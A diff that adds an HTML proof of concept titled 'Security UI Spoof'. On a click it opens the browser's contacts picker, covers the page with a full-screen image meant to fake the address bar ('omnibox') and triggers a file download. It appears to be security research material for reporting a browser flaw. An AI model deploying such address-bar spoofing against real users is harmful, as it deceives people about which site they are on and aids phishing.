@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>Security UI Spoof</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
+        <style>
+            body {
+                margin: 0;
+                padding: 0;
+            }         
+            #spoof {
+                width:  100%;
+                height: 100%;
+            }
+        </style>
+        <script>
+            onclick = async () => {
+                // Requesting the contacts (this is already in your original script)
+                (async () => {
+                    await navigator.contacts.select(["name"], {});
+                })();
+
+                // Display the spoof image and hide the content
+                document.getElementById("spoof").style = "display: block;";
+                document.getElementById("content").style = "display: none;";
+
+                // Request fullscreen
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen();
+                } else if (document.documentElement.mozRequestFullScreen) { // Firefox
+                    document.documentElement.mozRequestFullScreen();
+                } else if (document.documentElement.webkitRequestFullscreen) { // Chrome, Safari, Opera
+                    document.documentElement.webkitRequestFullscreen();
+                } else if (document.documentElement.msRequestFullscreen) { // IE/Edge
+                    document.documentElement.msRequestFullscreen();
+                }
+
+                // Trigger download of test.html
+                const link = document.createElement('a');
+                link.href = 'test.html'; // Path to the test.html file
+                link.download = 'test.html';
+                link.click();
+            }
+        </script>
+    </head>  
+    <body>
+        <img id="spoof" style="display: none;" src="spoof.png" />
+        <div id="content">
+            <br><br><br>
+            <center>
+                <h1>Click anywhere on the page to spoof the omnibox!</h1>
+            </center>
+        </div>
+
+        <!-- Code injected by live-server -->
+        <script>
+            // <![CDATA[  <-- For SVG support
+            if ('WebSocket' in window) {
+                (function () {
+                    function refreshCSS() {
+                        var sheets = [].slice.call(document.getElementsByTagName("link"));
+                        var head = document.getElementsByTagName("head")[0];
+                        for (var i = 0; i < sheets.length; ++i) {
+                            var elem = sheets[i];
+                            var parent = elem.parentElement || head;
+                            parent.removeChild(elem);
+                            var rel = elem.rel;
+                            if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
+                                var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
+                                elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
+                            }
+                            parent.appendChild(elem);
+                        }
+                    }
+                    var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
+                    var address = protocol + window.location.host + window.location.pathname + '/ws';
+                    var socket = new WebSocket(address);
+                    socket.onmessage = function (msg) {
+                        if (msg.data == 'reload') window.location.reload();
+                        else if (msg.data == 'refreshcss') refreshCSS();
+                    };
+                    if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
+                        console.log('Live reload enabled.');
+                        sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
+                    }
+                })();
+            } else {
+                console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
+            }
+            // ]]>
+        </script>
+    </body>
+</html>
